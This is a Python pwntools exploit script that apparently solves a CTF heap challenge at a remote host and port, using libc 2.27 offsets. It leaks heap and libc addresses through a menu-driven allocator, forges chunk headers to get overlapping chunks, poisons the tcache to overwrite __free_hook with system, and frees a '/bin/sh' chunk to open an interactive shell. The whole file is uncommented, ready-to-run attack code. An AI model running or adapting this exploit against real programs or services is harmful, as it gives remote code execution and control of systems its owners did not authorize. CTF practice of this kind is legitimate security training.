from pwn import *

###Util
def create(size,data):
    r.sendlineafter('choice: ','1')
    r.sendlineafter('size: ',str(size))
    r.sendafter('Content: ',data)

def delete(idx):
    r.sendlineafter('choice: ','2')
    r.sendlineafter('delete: ',str(idx))

def show(idx):
    r.sendlineafter('choice: ','3')
    r.sendlineafter('see: ',str(idx))
    return r.recvline()[9:-1]

###Addr
#  libc2.27
main_arena_offset = 0x3ebc40
unsorted_bin_offset = main_arena_offset+0x60
free_hook_offset = 0x3ed8e8
system_offset = 0x4f440

###Exploit
r = remote('nc.eonew.cn',10008)

create(0x1f8,'M30W')
create(0x1f8,'M30W')
delete(1)
delete(0)
create(0x1f8,'a')
heap_addr = u64(show(0).ljust(8,b'\x00'))-0x461
print(hex(heap_addr))

for i in range(5):
    create(0x1f8,'N30W')
create(0x1f8,b'\x00'*0x90+p64(heap_addr+0xfb0)+p64(0xa21)+p64(heap_addr+0xf98)+p64(heap_addr+0xfa0))
for i in range(4):
    create(0x1f8,'N30W')
create(0x1f8,b'\x00'*0x10+p64(0xa20)+p64(0x20))
delete(11)
for i in range(6):
    delete(i)
for i in range(5):
    delete(6+i)


create(0x1f8,'a'*0x218)
for i in range(6):
    create(0x1f8,'M30W')
create(0x78,'a'*8)
unsorted_bin_addr = u64(show(7)[8:]+b'\x00\x00')
libc_base = unsorted_bin_addr-unsorted_bin_offset
print(hex(libc_base))
for i in range(7):
    create(0x78,'M30W')
for i in range(7):
    delete(8+i)
delete(7)
delete(6)
for i in range(4):
    create(0x1ff,'M30W')
create(0x1d8,b'\x00'*0x1d8+p64(0x221)+p64(libc_base+free_hook_offset-0x8))
create(0x1f8,'M30W')
create(0x1f8,b'/bin/sh\x00'+p64(libc_base+system_offset))
delete(12)

r.interactive()
